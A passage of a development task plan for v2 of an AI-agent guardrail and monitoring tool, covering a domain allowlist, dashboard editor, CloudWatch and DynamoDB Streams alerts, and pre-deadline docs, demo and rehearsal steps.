    - Write the failing tests first. `test_rules.py`: null default, valid lists, invalid entries (`"http://x"`, `"a b"`, 254 chars, 101 entries) → 400. `test_validation.py`/`test_alerts.py`: `blocked_domain` requires `attemptedUrl`; alert lists `attemptedUrl`, `tool`, `host`. Extend Properties 32, 38, 39.
    - Implement in `rules.py`, `validation.py` (`OPTIONAL += ("attemptedUrl",)`, `TIMELINE_FIELDS`), `alerts.py`.
    - _Requirements: 34.1, 34.2, 34.6_
    - Commit: `feat(backend): allowedDomains and blocked_domain events`

  - [ ] 15.2 SDK domain check in the tool wrapper
    - Write the failing tests first. `sdk/tests/test_guardrails_domains.py`: `attempted_urls` finds http/https URLs in strings and list items, lowercases hosts, strips a trailing dot, ignores `ftp://` and bare words; `domain_allowed` handles exact and `*.` entries; the wrapped tool raises `DomainBlocked` with `attemptedUrl` and `meta.host`, sends one event, and runs when every host is allowed or the list is null. Add Property 41.
    - Implement in `guardrails.py` and `client.py` (`DomainBlocked` exported; order pause → paths → commands → domains).
    - _Requirements: 34.3, 34.4, 34.5_
    - Commit: `feat(sdk): domain allowlist in the tool wrapper`

  - [ ] 15.3 Dashboard allowed domains editor
    - Write the failing tests first. `RulesEditor.test.tsx`: shows "unrestricted" when null, "Restrict domains" switches to a list, add/remove, save sends the list or null.
    - Implement.
    - _Requirements: 34.7_
    - Commit: `feat(dashboard): allowed domains editor`

- [ ] 16. Operational alarms and reliable alerts (optional; alarms are cheap, Streams is last)
  - [ ] 16.1 CloudWatch alarms
    - Write the failing tests first. `test_template.py`: `ApiErrorsAlarm` and `Api5xxAlarm` with the metrics, `Period: 300`, `Threshold: 1`, `TreatMissingData: notBreaching`, and `AlarmActions` = the topic.
    - Implement in `template.yaml` on `feat/alarms`; PR; Tejaswi deploys.
    - _Requirements: 35.1, 35.2, 35.6_
    - Commit: `feat(infra): CloudWatch alarms on Lambda errors and API 5xx`

  - [ ] 16.2 Stream-based alerts
    - Write the failing tests first. `backend/tests/test_stream_alerts.py`: the handler ignores non-INSERT records and non-blocked events; publishes once after a successful conditional `UpdateItem` (`alerted`) and not when the condition fails; one bad record does not stop the batch. `test_template.py`: `StreamSpecification`, `AlertFunction` with the stream event and exactly the three policies; `ingest_event` skips publishing when `STREAM_ALERTS=1`.
    - Implement `handlers/stream_alerts.py`, the template, and the env flag on `feat/stream-alerts`; PR; deploy; confirm one email per block (not two) in `e2e.sh`.
    - _Requirements: 35.3, 35.4, 35.5, 35.6_
    - Commit: `feat(infra): DynamoDB Streams alert function`

- [ ] 17. Feature freeze (2026-10-19): docs, smoke test, rehearsal
  - [ ] 17.1 README, ARCHITECTURE, SUBMISSION updates
    - Write the failing tests first. `test_readme.py`: README documents `blockedCommands`, `maxLlmCallsPerMinute`, pause, the five new exception names that shipped, the `agentwatch` CLI, webhooks, and the new Known limitations (regex over-blocking, pause propagation, redaction scope if shipped); ARCHITECTURE mentions the status routes and the control plane; SUBMISSION's "What it does" lists the new moments and the "Next steps" list drops what shipped. The secret scan still passes.
    - Write the docs. Keep every statement true to what actually shipped (skip optional groups that did not).
    - _Requirements: 37.1, 37.2, 37.5_
    - Commit: `feat(docs): v2 README, architecture, submission`

  - [ ] 17.2 DEMO_SCRIPT v2
    - Write the failing tests first. `test_readme.py`: DEMO_SCRIPT mentions `--loop 20 --sleep 2`, "Pause agent", "Confirm pause", `CommandBlocked`, the chart, and the webhook channel; prep steps mention resuming both agents.
    - Rewrite `docs/DEMO_SCRIPT.md`: prep (clear rules, resume agents, `aws login` right before recording), the on-camera order (problem, 3 lines + `agentwatch init`, inventory, path block + email + channel, shell block, pause moment with the loop, spend cap with the chart, how it's built), expected lines, troubleshooting (a stale pause, a pattern that over-blocks, no channel message).
    - _Requirements: 37.3_
    - Commit: `feat(docs): demo script v2`

  - [ ] 17.3 e2e v2 full pass
    - Confirm `scripts/e2e.sh` covers path block, shell block, spend cap, pause/resume, and rate limit, resets everything on exit, and `test_e2e_script.py` pins it. Tejaswi runs it on the deployed stack; all steps PASS; email and channel counts match the blocks.
    - _Requirements: 37.4_
    - Commit: `test(demo): e2e v2`

  - [ ] 17.4 Interview prep and codebase guide refresh
    - Add 2 to 3 questions per completed v2 task to `docs/INTERVIEW_PREP.md` (any that the session handoff hook missed), and update `docs/CODEBASE_GUIDE.md`: the v2 features section, the route table, the data model, the tech stack rows, the numbers table, and 8 to 10 new interview questions (control plane vs. rules plane, once-per-episode reporting, regex guard tradeoffs, sliding window, fan-out isolation, host allowlist, 0600 key file, idempotent redaction).
    - _Requirements: 37.6_
    - Commit: `docs: interview prep and codebase guide for v2`

  - [ ] 17.5 Final checkpoint: rehearsal v2 (closes v1 task 7.5 too)
    - All three suites pass. Tejaswi follows `docs/DEMO_SCRIPT.md` end to end on the deployed stack, records pause-to-stop, block-to-email, and block-to-channel timings in `PROGRESS.md`, and ticks 7.5 in the v1 `tasks.md`. Stop adding features. Record the video from `docs/DEMO_SCRIPT.md` and submit using `docs/SUBMISSION.md` by 2026-10-23.
    - _Requirements: 37.7_

## Notes

- Property tests are required and live inside the task that adds the logic. Optional groups are marked `*`; skip them without guilt if the schedule slips. The freeze date is fixed: on 2026-10-19 move to group 17 whatever the state of 14 to 16.
- Properties that extend a v1 property (32, 34, 36, 38, 39) are new test functions. Never edit a v1 property test to add v2 clauses; the v1 suite is the regression baseline.
- Properties split across groups (32, 38, 39) get one test each in the first group that needs them; later groups extend that same test with the new clause instead of adding a second one.
- Deploys: 8.2, 9.7 (backend redeploy), 11.2, 12.4 (backend redeploy), 16.x. Every change set passes `UsePreviousValue` for `AlertEmail`, `DashboardOrigin`, and `AlertWebhookUrl`. Amplify rebuilds the dashboard from `main` on its own.
- If AWS access blocks a checkpoint, log it under "Blocked" in `PROGRESS.md` and continue with the next local task, as in v1.
- Not automated by design: pause propagation latency, channel delivery time, alarm firing. They are observed in 8.7, 11.3, and 17.5.
